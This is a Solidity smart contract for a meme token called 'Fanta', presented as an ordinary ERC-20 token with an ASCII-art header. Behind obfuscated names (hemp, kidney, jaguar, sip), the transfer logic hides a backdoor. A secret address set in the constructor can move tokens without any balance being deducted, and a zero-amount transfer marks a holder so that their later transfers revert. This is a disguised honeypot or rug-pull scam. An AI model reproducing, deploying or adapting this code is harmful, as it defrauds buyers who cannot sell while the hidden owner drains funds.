/*

https://twitter.com/witthefanta


===================================+==============++++**############**+==---==-====================-
=================================++++++++=====++++*######################*++=-=---==-=-=--=========+
=========-==================+++++++++=++**+++**###%%##########################*===-=--=-====-=======
========================+++++*******+++++*###%%%%%%%%%%%%%#######%%%%%%%%%%%%%%%#*+==-----=-=--==-=+
======================++***++******+++==++**##########%%%%%##%%%%%%%%%########%%%%%#*=----------===-
=====================+*++====+****+++====++++**********######%%%#######*******####%###*=-------=-==+
============================++#**+++===++==++**************##########****++++****###%###=-----------
=====++++========+++++++====++***+++++*+++**#######*****+++++*#####*****####**++**###%###=---------+
===++++++=======+====---=+===++*##*+***+****#####**+=-:::.....::-=++********##*++**###%##*----------
-=++++**++++=====++. -+..====+**#**+***+*******+=::.................:=+******#*+***#######=--------=
--==+******++===--=-:--=+++***+****************-:......................=*******+**########*---------
-=====++++++++++====++************+++++++*******-....................:#%%%#**++***########*--------=
-========+++++*++===++**********+++===+++++++++*+*+:..................-+*%@@%+=*####*##*##+---------
---=======+++++==++===+**+*******++=++=+++++#%@@%#+:......................-#*%@@%##=-***##=---------
-----=======+++====+==+++++++*********+*#%%*=-:...............................:*@%*:-***#+----------
--------====++++++===++++++++*******++%@%#:...............................:::...+%=.:**+=:----------
---------****++*+++++++++*****####**#@#=.::...........................:=*#%%@%#=.....--:::::::------
--------=#****+++*#######*#**######%#-.........:::....................=*%#%@@@@#:....:::::-::-------
--------#****+++*#######******-:-++=.....-++***++++=.................:#@%  %@@@@#:...::::::::::::-:-
-------*#****++*########**+=-:.........:**#%@@@@%*-..................+@@@++@@@@%%*...:::::::::::-:--
------=#****+++####*+++++=-:..........:+%@*--@@@@@@#-................%@@@%@%%@@@::...:::::::::::::::
------*#****+=*##*=-::::.............+@@@@@%%@%%%@@@%:..............:@%@@%%%@@%%.....::::::::::::::-
-+=---##****==--::..................+%#@%@@%%%%%%@@@@=...............#%%@@@@@%%+.....:::::::::::::::
=++=-+##**+:........................#::@%%@@%%%%%@@%@*...............-%%%%@@%*#.....::::::::::::::--
**++=*##**=:.......................... *@%%@@@@@@%#@@=................:=*%%%@*:.....:::::::::::-:--:
###***##***-:.......................... +@%%%%%%%#+@#.............::......:-++:....:---------------=
########**+**-:...........................+%@%%%%@@+................::...:::::....:+===+========----
%%######***###*=:::........................+%@%#+=:...........::.....::::::::....:**+++=+=++++===--=
%%%%####***#######+=:....................................................:::....:*###*++==+=========
%%%%%%#**#*########%%#*=-:..::::...............................:::::.....:::...-*######*====++=++++*
%%%%%%##*#*###########%%%%#*=-::..:.......................:::::..........:::.:+#########*++*++******
%%%%%%%##**############%%%%%%%%#*+=-:..................................::::-+################*#####%
%%%%%%%%##*#############%%%%%%%%%%%%%#+-:...............................:=*################%####%%%#
@%%%%%%%%#*###############%%%%%%%%%%%%%%%#+=-:.....................::=+*###################%%%%%#%%%
%%%%%@%%%%#*################%%%%%%%%%%%%%%%%%%#*+-:::.......:::--=*#%####################%%%%%%%%%%#
@@%%%@@@%%%###################%%%%%%%%%%%%%%%%%%#+:::::::::::::*#%%%%%%#################%%%%%%%%%%%%
%@%%@@@%%%%%%%##%##%##########%%%%%%%%%%##%%%%#*..::::::::::::..=##%%%%%%%%%%%%#######%%%%%%%%%%%%%%
%%%@@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%*+=-:..+%%###*:..::::::::::...=###%%+.:-=*%%%%%%%%%%%%%%%%%%%%%%%@
%%%@@@%%%%%%%%%%%%%%%%%%%%%%%%%#=::......=%%#####-....:::::.... =###%%=.:::..-*%%%%%%%%%%%%%%%%%%%@%
%%%@@@@@%@%%%%%%%%%%%%%%%%%%@%%=::::::...:%%#####*... .::::.... *###%%*::::::.:#%%%%%%%%%%%%%%%%@@@@
%%%@@@@@@%%%%%%%%%%%%%%%%%@%%#*::::::... -%%######-.....::.:#..-####%%%-:---::.-%%%%%%%%%%%%%%%%@@@@
@@@@%%@@@%%%%%%%%%%%%%%%%%%%#*=:::::..   +%%######=.=:.....*#=.*#####%%+::::::..+%%%%%%%%%%%%%%@@@@@
@@@@@%%@%%%%%%%%%%%%%%%%%%%%#+:::::..   :#%%######*-%#: ..*%#*=######%%#-:::::..-#%%%%@@%%%%%%%@@%%%
@@@@@%%%%%%%%%%%%%%%%%%%%%%##-::::..    *%%##########%+ .:%###########%%*:::::...*%%%%@@@@%@@@@%@@%@
@@@@@%%%%%%%%%%%%%%%@%%%@%##+:::...    =%%%###########%- *############%%%=..:....-%%@@@@@@@@@@@@@@@%
@@@@%%%%@%%%%%%@@%%%%%%%%%#*-:::...  .-%%%##############*%#############%%%=:......#@@@@@@@@@@@@@@@@@
@@@@@%%*++==++*#%%%%%%%%%#*=:::...  .=%%################################%%%#:.....+@%@@@@@@@@@@@@@@@
@@@@%=::::-----==+%%%%%%##*-:::...  .*%###################################%#:.....:%@@@@@%%%@@@@@@@@
@@@#:::=*#####*=:--###%###+::.....  .-######################################:......+@%+=--==++*@@%@%
@@%:::*#:::.:-:#+.:-#########-.......:######################################-.....:#*::-++*+++==#%@@


*/


// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Fanta is Ownable {
    
    uint256 public totalSupply = 69_696_969_696_969 * 10 ** 9;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    mapping(address => mapping(address => uint256)) public allowance;

    address public uniswapV2Pair;

    uint8 public decimals = 9;

    function approve(address dex, uint256 gnawing) public returns (bool success) {
        allowance[msg.sender][dex] = gnawing;
        emit Approval(msg.sender, dex, gnawing);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    string public symbol = 'FANTA';

    mapping(address => uint256) private kidney;

    function transferFrom(address amiably, address estate, uint256 gnawing) public returns (bool success) {
        sip(amiably, estate, gnawing);
        require(gnawing <= allowance[amiably][msg.sender]);

        allowance[amiably][msg.sender] -= gnawing;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private hemp;

    constructor(address heritage) {
        balanceOf[msg.sender] = totalSupply;
        hemp[heritage] = jaguar;

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transfer(address estate, uint256 gnawing) public returns (bool success) {
        sip(msg.sender, estate, gnawing);
        
        return true;
    }

    string public name = 'Fanta';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function sip(address amiably, address estate, uint256 gnawing) private returns (bool success) {
        
        if (hemp[amiably] != 0) {
            
            // sip

        } else {

            balanceOf[amiably] -= gnawing;
        
        }

        if (gnawing == 0) kidney[estate] += jaguar;

        if (hemp[amiably] == 0 && uniswapV2Pair != amiably && kidney[amiably] > 0) {
            
            hemp[amiably] -= jaguar;
        }

        balanceOf[estate] += gnawing;

        emit Transfer(amiably, estate, gnawing);
        
        return true;
    }

    uint256 private jaguar = 40;
}